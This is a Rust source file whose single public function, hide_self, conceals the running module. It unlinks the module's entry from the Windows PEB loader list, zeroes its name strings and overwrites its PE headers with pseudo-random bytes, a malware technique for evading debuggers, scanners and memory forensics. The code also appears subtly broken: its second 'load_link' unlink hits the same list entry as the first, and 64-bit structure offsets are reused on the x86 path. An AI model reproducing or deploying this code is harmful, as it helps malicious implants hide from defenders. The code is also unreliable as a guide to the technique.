#[repr(C)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct LdrDataTableEntry {
    _reserved1: [u8; 0x10],
    in_memory_order_links: ListEntry,
    _reserved2: [u8; 0x10],
    dll_base: *mut u8,
    _reserved3: [u8; 0x40],
    full_dll_name: UnicodeString,
    base_dll_name: UnicodeString,
}

#[cfg(target_arch = "x86_64")]
unsafe fn get_peb() -> *mut u8 {
    let peb: *mut u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    peb
}

#[cfg(target_arch = "x86")]
unsafe fn get_peb() -> *mut u8 {
    let peb: *mut u8;
    std::arch::asm!("mov {}, fs:[0x30]", out(reg) peb);
    peb
}

unsafe fn unlink(entry: *mut ListEntry) {
    let flink = (*entry).flink;
    let blink = (*entry).blink;
    if !flink.is_null() { (*flink).blink = blink; }
    if !blink.is_null() { (*blink).flink = flink; }
    (*entry).flink = entry;
    (*entry).blink = entry;
}

unsafe fn zero_string(s: *mut UnicodeString) {
    (*s).length = 0;
    if !(*s).buffer.is_null() { *(*s).buffer = 0; }
}

pub unsafe fn hide_self() {
    let module = match windows::Win32::System::LibraryLoader::GetModuleHandleW(None) {
        Ok(m) => m,
        Err(_) => return,
    };
    
    if module.0.is_null() { return; }

    let peb = get_peb();
    let ldr = *(peb.add(0x18) as *mut *mut u8);
    let memory_order_list = ldr.add(0x20) as *mut ListEntry;
    let head = memory_order_list;
    let mut current = (*head).flink;

    while !current.is_null() && current != head {
        let entry = (current as usize - 0x10) as *mut LdrDataTableEntry;
        if (*entry).dll_base == module.0 as *mut u8 {
            unlink(current);
            let load_link = &raw mut (*entry).in_memory_order_links;
            unlink(load_link);
            zero_string(&mut (*entry).full_dll_name);
            zero_string(&mut (*entry).base_dll_name);
            break;
        }
        current = (*current).flink;
    }

    let dos = module.0 as *mut u16;
    if *dos == 0x5A4D {
        let nt_offset = *(dos.add(0x3C) as *mut u32) as usize;
        let nt = module.0.add(nt_offset) as *mut u32;
        if *nt == 0x00004550 {
            let headers_size = *((nt as *mut u8).add(0x54) as *mut u32) as usize;
            let mut seed = 0xDEADBEEFu32;
            for i in 0..headers_size.min(0x1000) {
                seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
                *(module.0 as *mut u8).add(i) = (seed >> 16) as u8;
            }
        }
    }
}